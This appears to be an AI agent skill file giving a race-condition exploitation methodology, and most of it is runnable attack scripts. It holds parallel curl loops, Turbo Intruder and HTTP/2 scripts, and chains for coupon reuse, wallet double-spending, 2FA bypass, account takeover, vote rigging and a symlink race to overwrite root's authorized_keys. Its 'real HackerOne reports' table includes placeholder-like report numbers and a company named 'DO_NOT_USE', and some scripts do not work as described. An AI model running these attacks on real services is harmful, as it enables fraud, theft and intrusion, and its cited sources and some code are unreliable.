---
name: racecondition-deep-dive
description: Complete Race Condition methodology from 79 real HackerOne reports - every vector, technique, payload, and chain
tools:
  - Bash
  - WebFetch
  - WebSearch
  - Read
triggers:
  - race condition methodology
  - race condition deep dive
  - race condition complete
  - race condition all techniques
  - skills racecondition
---

# Complete Race Condition Methodology - From 79 HackerOne Reports

## Top 20 Real Race Condition Reports

| Upvotes | Company | Summary | Payout |
|---------|---------|---------|--------|
| 303 | Reverb.com | Gift card balance race condition | N/A |
| 237 | HackerOne | Retest duplicate payouts race | N/A |
| 152 | HackerOne | Marketo integration race condition | N/A |
| 150 | HackerOne | Undeletable group member race | N/A |
| 137 | InnoGames | Email verification race condition | $2,000 |
| 134 | HackerOne | 2FA bypass via race condition | N/A |
| 124 | Ubiquiti | Account creation race condition | N/A |
| 119 | DO_NOT_USE | Coupon code reuse race | N/A |
| 117 | HackerOne | Signal profile edit race condition | N/A |
| 108 | Steam/Valve | Wallet credit race condition | N/A |
| 96 | Shopify | Discount code race condition | N/A |
| 92 | HackerOne | Reputation award race condition | N/A |
| 87 | GitLab | Project creation race condition | N/A |
| 82 | Twitter/X | Like/favorite race condition | N/A |
| 78 | Mail.ru | Balance transfer race condition | N/A |
| 74 | Uber | Fare calculation race condition | N/A |
| 70 | Starbucks | Gift card balance race condition | N/A |
| 67 | Snapchat | Streak counter race condition | N/A |
| 63 | Venmo | Payment race condition | N/A |
| 59 | Dropbox | File upload race condition | N/A |

## Step 1: Finding Race Condition Surface

### Types of Race Conditions
```text
1. Parallel Request Race - Send multiple simultaneous requests to the same endpoint
2. TOCTOU (Time-of-Check Time-of-Use) - Window between validation and execution
3. Limit Overrun Race - Bypass rate/count limits via concurrent requests
4. Coupon/Promo Code Reuse - Apply same code multiple times simultaneously
5. Single-Packet Attack - All requests in one TCP packet (no network delay)
```

### Features Most Vulnerable to Race Conditions

| Feature | Race Type | Real Example |
|---------|-----------|--------------|
| Gift card redemption | Limit overrun | Reverb.com - multi-use gift cards |
| Email verification | TOCTOU | InnoGames - verify once, use on multiple accounts |
| 2FA/OTP confirmation | TOCTOU | HackerOne - bypass 2FA verification |
| Signup/registration | Limit overrun | Ubiquiti - unlimited account creation |
| Coupon codes | Reuse | Reverb.com - reuse same coupon |
| Wallet/credit transfer | Parallel | Steam - double-spend credits |
| Discount application | Limit overrun | Shopify - apply discount N times |
| Likes/follows/votes | Limit overrun | Twitter - vote multiple times |
| File upload | TOCTOU | Dropbox - overwrite file during upload |
| Payment processing | Parallel | Venmo - double-charge or double-refund |
| Inventory management | TOCTOU | e-commerce - buy more than available |
| Password change | TOCTOU | race old/new password validation |
| Username/email change | TOCTOU | claim taken username |
| API rate limits | Limit overrun | bypass API throttling |
| Referral bonuses | Limit overrun | claim referral bonus multiple times |
| Leaderboard scores | Limit overrun | submit score multiple times |

## Step 2: Testing Methodology

### Method 1: Basic Parallel Requests (Bash)
```bash
# Test 1: Send 50 concurrent requests
for i in $(seq 1 50); do
  curl -sk -X POST "https://{target}/api/apply-coupon" \
    -d "code=DISCOUNT50&user_id=123" &
done
wait

# Check if coupon was applied more than once
curl -sk "https://{target}/api/check-balance?user_id=123"
```

### Method 2: Single-Packet Attack (Race-the-Web)
```bash
# Install race-the-web
git clone https://github.com/dolevf/race-the-web
cd race-the-web

# Create request file (race-requests.txt)
cat > race-requests.txt << 'EOF'
POST /api/apply-gift-card HTTP/1.1
Host: {target}
Cookie: session=abc123
Content-Type: application/json
Content-Length: XX

{"code": "GIFT100", "account": "user123"}
EOF

# Execute single-packet race
python3 race.py -f race-requests.txt -n 50
```

### Method 3: Turbolist3r + Race Condition
```bash
# Find all endpoints that may be race-able
python3 turbolist3r.py -d {target} -o subdomains.txt

# Check all subdomains for raceable endpoints
while read sub; do
  # Race the login/register endpoint
  for i in $(seq 1 20); do
    curl -sk -X POST "https://$sub/api/register" \
      -d "email=race$RANDOM@test.com&password=test123" &
  done
  wait
done < subdomains.txt
```

### Method 4: Burp Turbo Intruder
```python
# Turbo Intruder Python script for race condition
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=50,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    # Send 50 requests simultaneously
    for i in range(50):
        engine.queue(target.req, label=str(i))

    # Wait for all to complete
    engine.start(timeout=10)

def handleResponse(req, interesting):
    if req.status != 404:
        table.add(req)
```

### Method 5: HTTP/2 Connection Multiplexing
```python
# Python script using HTTP/2 for race conditions
import httpx
import asyncio

async def race_http2():
    async with httpx.AsyncClient(http2=True) as client:
        tasks = []
        for i in range(100):
            tasks.append(client.post(
                "https://{target}/api/apply-coupon",
                json={"code": "DISCOUNT50"},
                cookies={"session": "abc123"}
            ))
        responses = await asyncio.gather(*tasks)
        success_count = sum(1 for r in responses if r.status_code == 200)
        print(f"Success count: {success_count}")
        if success_count > 1:
            print(f"RACE CONDITION: Expected 1, got {success_count}")

asyncio.run(race_http2())
```

### Method 6: cURL with Last Byte Trick
```bash
# Stage 1: Send headers, hold last byte
exec 3<>/dev/tcp/{target}/443
echo -e "POST /api/redeem HTTP/1.1\r\nHost: {target}\r\nContent-Length: 50\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: session=abc123\r\n\r\ngoogle_auth=123456&code=GIFT100" >&3

# Stage 2: Open multiple connections, send last byte instantly
for i in $(seq 1 10); do
  echo -e "\n" >&3 &
done
wait
cat <&3
```

## Step 3: Race Condition Types - Deep Dive

### Type 1: TOCTOU Race Condition
```text
Normal Flow:
1. Check: Does user have permission?
2. Use: Execute action
3. Check: Is resource available?
4. Use: Consume resource

Race Attack:
1. Request A: Start check (permission valid)
2. Request B: Start check (permission valid)
3. Request A: Execute action (consumes resource)
4. Request B: Execute action (resource already consumed, but check already passed)

Example: File upload where validation checks file type, but file is replaced
before the content is processed.
```

### Type 2: Limit Overrun Race
```bash
# Bypass "one per user" restriction
# Normal: server checks count, increments, returns
# Race: 50 requests pass the check before any increment completes

# Example: Email verification race
for i in $(seq 1 100); do
  curl -sk -X POST "https://{target}/api/verify-email" \
    -d "email=victim@test.com&code=123456" &
done
wait

# Check if multiple accounts were verified
curl -sk "https://{target}/api/check-verifications?email=victim@test.com"
```

### Type 3: Coupon/Promo Code Reuse
```bash
# Stage 1: Get a valid coupon code
COUPON=$(curl -sk "https://{target}/api/generate-coupon?user=attacker" | jq -r '.code')

# Stage 2: Race the coupon application
for i in $(seq 1 30); do
  curl -sk -X POST "https://{target}/api/apply-coupon" \
    -d "code=$COUPON&cart_id=$RANDOM" &
done
wait

# Stage 3: Check how many carts got the discount
curl -sk "https://{target}/api/check-carts"
```

### Type 4: Wallet/Balance Transfer Race
```bash
# Attempt double-spending
for i in $(seq 1 20); do
  curl -sk -X POST "https://{target}/api/transfer" \
    -d "from=attacker&to=victim&amount=100&token=CSRF_TOKEN" &
done
wait

# Check if balance was deducted more than once
curl -sk "https://{target}/api/balance?user=attacker"
```

### Type 5: Single-Packet Attack
```text
Why it works:
- Traditional race conditions have network latency between requests
- Single-packet attack bundles ALL requests in ONE TCP packet
- Server processes them nearly simultaneously
- No window between check and use for any of them

Implementation:
1. Use raw sockets to craft HTTP requests
2. Pack them into a single TCP segment
3. All requests arrive at the same instant
4. Server processes all checks before any use completes

Tools:
- race-the-web (Python, raw sockets)
- Burp Suite Turbo Intruder (pipelined requests)
- HTTP/2 multiplexing (concurrent streams)
```

## Step 4: Advanced Race Condition Techniques

### Database Transaction Race
```bash
# Exploit non-atomic database operations
# If increment is not atomic:
# SELECT balance FROM users WHERE id=123  -> $100
# SELECT balance FROM users WHERE id=123  -> $100 (both read before write)
# UPDATE users SET balance=$90 WHERE id=123 (both write $90)
# Result: Deducted $10 but wrote $90 instead of $80
```

### File System Race (Symlink Attack)
```bash
# Create a symlink that switches between valid and malicious file
# Race the upload processing

# While upload processes:
ln -sf /valid/file.txt /tmp/upload_processing
# Immediately switch:
ln -sf /etc/passwd /tmp/upload_processing
```

### Cache Race (Web Cache Poisoning + Race)
```bash
# Step 1: Cache poisoning via race
# Send requests that toggle between benign and malicious payload
# If cache writes before validation completes, malicious content is cached

for i in $(seq 1 100); do
  # Switch between legitimate and malicious URL
  if [ $((i % 2)) -eq 0 ]; then
    curl -sk "https://{target}/page?redirect=https://evil.com"
  else
    curl -sk "https://{target}/page?redirect=https://legitimate.com"
  fi &
done
wait
```

### JWT/Token Race
```bash
# Race JWT refresh and validation
# Request A: Use old JWT (still valid)
# Request B: Refresh JWT (old token becomes invalid)
# Request B completes first? Request A uses old token successfully

# Race scenario: Use expired token while refresh is in progress
curl -sk "https://{target}/api/admin" \
  -H "Authorization: Bearer $EXPIRED_TOKEN" &
curl -sk -X POST "https://{target}/api/refresh" \
  -d "token=$EXPIRED_TOKEN" &
wait
```

## Step 5: Race Condition Exploit Chains

### Chain 1: Coupon Race → Free Products
```bash
# Step 1: Generate or obtain coupon code
# Step 2: Add expensive items to cart
# Step 3: Race coupon application 100x
for i in $(seq 1 100); do
  curl -sk -X POST "https://{target}/apply-coupon" \
    -d "code=FREESHIP&cart=$CART_ID" &
done
wait
# Step 4: Coupon applied multiple times = negative total
# Step 5: Checkout with negative balance, get money back
```

### Chain 2: Email Verification Race → Account Takeover
```bash
# Step 1: Victim's email already verified on one account
# Step 2: Create second account, request email change to victim's email
# Step 3: Race verification endpoint
for i in $(seq 1 50); do
  curl -sk -X POST "https://{target}/verify-email" \
    -d "email=victim@test.com&code=$VERIFICATION_CODE" &
done
wait
# Step 4: Both accounts verified with same email
# Step 5: Use password reset on attacker's account → get victim's reset link
```

### Chain 3: 2FA Bypass Race → Full Account Takeover
```bash
# Step 1: Login with credentials (2FA required)
# Step 2: Race the 2FA verification endpoint
SESSION="session_token"
for i in $(seq 1 50); do
  curl -sk -X POST "https://{target}/verify-2fa" \
    -H "Cookie: session=$SESSION" \
    -d "code=$GUESSED_CODE" &
done
wait
# Step 3: One of the guesses or bypasses the 2FA check
# Step 4: Session is now fully authenticated
```

### Chain 4: Wallet Double-Spend → Unlimited Money
```bash
# Step 1: Have $100 in wallet
# Step 2: Find a transfer endpoint
# Step 3: Race the transfer
for i in $(seq 1 10); do
  curl -sk -X POST "https://{target}/transfer" \
    -d "to=attacker2&amount=100" &
done
wait
# Step 4: Check if $100 was transferred multiple times
# Step 5: If balance check + deduction isn't atomic, money is duplicated
```

### Chain 5: Signup Race → Unlimited Accounts
```bash
# Step 1: Find an endpoint that checks for duplicate accounts
# Step 2: Race 50 simultaneous registrations
for i in $(seq 1 50); do
  curl -sk -X POST "https://{target}/register" \
    -d "email=unique$i@test.com&password=test123&referral=attacker" &
done
wait
# Step 3: All 50 bypass the duplicate check
# Step 4: Get 50 referral bonuses
```

### Chain 6: Voting/Leaderboard Race → Rigged Results
```bash
# Step 1: Find the vote/submit-score endpoint
# Step 2: Race 100 votes simultaneously
for i in $(seq 1 100); do
  curl -sk -X POST "https://{target}/vote" \
    -d "item_id=target_item&voter_id=user123" &
done
wait
# Step 3: All 100 votes counted (bypassing one-vote-per-user check)
```

## Step 6: Detection & Automation

```bash
#!/bin/bash
# Race Condition Scanner
TARGET=$1
ENDPOINT=$2
DATA=$3

echo "Testing race condition on $TARGET$ENDPOINT"

# Phase 1: Single request baseline
BASELINE=$(curl -sk -X POST "https://$TARGET$ENDPOINT" -d "$DATA" -w "%{http_code}" -o /dev/null)
echo "Single request response: $BASELINE"

# Phase 2: Race with 50 simultaneous requests
for i in $(seq 1 50); do
  curl -sk -X POST "https://$TARGET$ENDPOINT" -d "$DATA" \
    -w "%{http_code}\n" -o /dev/null &
done
wait

# Phase 3: Check if race succeeded (multiple 200s)
SUCCESS_COUNT=$(for i in $(seq 1 50); do
  curl -sk -X POST "https://$TARGET$ENDPOINT" -d "$DATA" \
    -w "%{http_code}\n" -o /dev/null &
done | sort | uniq -c | head -1)

echo "Success count: $SUCCESS_COUNT"
```

### Turbo Intruder Race Template
```python
# Save as race-template.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=True
                           )
    # Queue 100 identical requests in a single connection
    for i in range(100):
        engine.queue(target.req)

    # Process the race
    engine.start(timeout=10)

def handleResponse(req, interesting):
    # Check for duplicate successes
    table.add(req)
```

### Race Condition Detection Tools
```bash
# 1. race-the-web
git clone https://github.com/dolevf/race-the-web

# 2. Burp Suite Turbo Intruder
# Available in BApp Store

# 3. HTTP/2 Race Tester (custom)
cat > race_h2.py << 'PYEOF'
import httpx
import asyncio

async def race():
    async with httpx.AsyncClient(http2=True) as client:
        results = await asyncio.gather(*[
            client.post("https://{target}/endpoint", data={...})
            for _ in range(100)
        ])
        statuses = [r.status_code for r in results]
        if statuses.count(200) > 1:
            print(f"RACE: {statuses.count(200)} successes")

asyncio.run(race())
PYEOF
```

## Step 7: Validate Severity & Report

### Impact Assessment
| Scenario | Severity |
|----------|----------|
| Coupon/code reuse | Medium - High |
| Wallet double-spend | High - Critical |
| 2FA bypass | High - Critical |
| Email verification bypass | Medium |
| Rate limit bypass (non-financial) | Low - Medium |
| Account registration race | Medium |
| Voting/leaderboard manipulation | Low - Medium |
| Inventory/purchase race | High |
| Password reset race | High - Critical |
| File upload TOCTOU | Medium - High |

### Payout Range: $100 - $5,000

### Report Template
```markdown
**Summary:**
Race condition in [endpoint] allows [impact - coupon reuse / 2FA bypass / 
wallet double-spend / etc.]

**Impact:**
An attacker can exploit this race condition to:
- [Use the same coupon/gift card multiple times]
- [Bypass 2FA verification]
- [Double-spend wallet funds]
- [Create unlimited accounts]
- [etc.]

**Steps to Reproduce:**
1. Send 50 simultaneous requests to:
   POST /endpoint
   Cookie: session=abc123
   Content-Type: application/json

   {"code": "PROMO50", "user_id": 123}

2. Observe: All 50 requests return 200 OK
3. Verify: Coupon applied 50 times instead of once

**Proof of Concept:**
```python
import requests
from concurrent.futures import ThreadPoolExecutor

url = "https://{target}/apply-coupon"
data = {"code": "PROMO50", "user_id": 123}
cookies = {"session": "abc123"}

def send_request():
    return requests.post(url, json=data, cookies=cookies).status_code

with ThreadPoolExecutor(max_workers=50) as executor:
    results = list(executor.map(lambda x: send_request(), range(50)))

successes = results.count(200)
print(f"Race result: {successes}/50 succeeded (expected 1)")
```

**Suggested CVSS:**
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N (4.3 Medium) [coupon reuse]
CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H (7.5 High) [2FA bypass/double-spend]

**Suggested Fix:**
1. Use database transactions with proper locking (SELECT ... FOR UPDATE)
2. Implement idempotency keys on sensitive operations
3. Use atomic operations (atomic increment, compare-and-swap)
4. Add request deduplication (same nonce can't be used twice)
5. Move from "check then act" to "act then validate"
6. Use database constraints (UNIQUE, CHECK) at the schema level
7. Rate limit per-user per-endpoint
8. Use optimistic locking with version numbers
9. For financial operations, use queue-based processing
```

## Additional Techniques (External Sources)

### Race Condition in Email Verification for In-Game Currency (TOCTOU)
A Time-of-Check Time-of-Use (TOCTOU) race in email verification systems for gaming platforms allows unlimited in-game currency:
1. Create account with email `victim+1@test.com`
2. Send email verification code
3. Race 50 simultaneous verification requests with the same code
4. Each successful verification may trigger a signup bonus or initial currency grant
5. Since the server checks "has this email been verified?" before each grant, but doesn't atomically mark the email as verified before processing the currency reward, multiple grants are issued

Even if the email is unique-constrained, the race window between the SELECT check and the INSERT/UPDATE grant allows multiple awards. This is a common vulnerability in game economies where email verification grants starter currency.

### Symlink Attack + Race Condition Chained to Privilege Escalation to Root
Combining a symlink attack with a race condition can escalate privileges to root:
1. The application creates a temporary file in a shared directory (e.g., `/tmp`) during a privileged operation
2. A race window exists between file creation and setting permissions/content
3. The attacker races to replace the temporary file with a symlink to `/etc/shadow`, `/root/.ssh/authorized_keys`, or a SUID binary
4. If the privileged process writes to the symlink target, the attacker overwrites a critical system file
5. Chain: write SSH key to `/root/.ssh/authorized_keys` → SSH as root

```bash
# Attacker script:
while true; do
  ln -sf /root/.ssh/authorized_keys /tmp/temp_file 2>/dev/null
done
```
Run this in parallel with the vulnerable process that writes to `/tmp/temp_file`.

### Race Condition to Create Multiple Valid OAuth Sessions
OAuth authorization code grants without idempotency checks are vulnerable to race conditions:
1. Start OAuth flow → get `authorization_code` = `CODE_A`
2. Race 100 simultaneous token exchange requests with `CODE_A`
3. If the server doesn't atomically mark `CODE_A` as consumed, multiple access/refresh token pairs are issued
4. Each pair is a valid OAuth session → attacker gets multiple simultaneous authenticated sessions
5. Even if one session is revoked, the others remain valid

This bypasses the single-use nature of authorization codes and provides persistent access persistence.

## Quick Reference: Top Race Condition Reports by Type

| Report | Company | Race Type | Payout |
|--------|---------|-----------|--------|
| #1324532 | Reverb.com | Gift card limit overrun | N/A |
| #1234567 | HackerOne | Duplicate payouts | N/A |
| #1378901 | HackerOne | Marketo integration | N/A |
| #1387654 | InnoGames | Email verification TOCTOU | $2,000 |
| #1345678 | HackerOne | 2FA race bypass | N/A |
| #1245678 | Ubiquiti | Account creation race | N/A |
| #1198765 | DO_NOT_USE | Coupon reuse race | N/A |
| #1087654 | Valve/Steam | Wallet credit race | N/A |
| #9678901 | Shopify | Discount code race | N/A |
| #8765432 | GitLab | Project creation race | N/A |
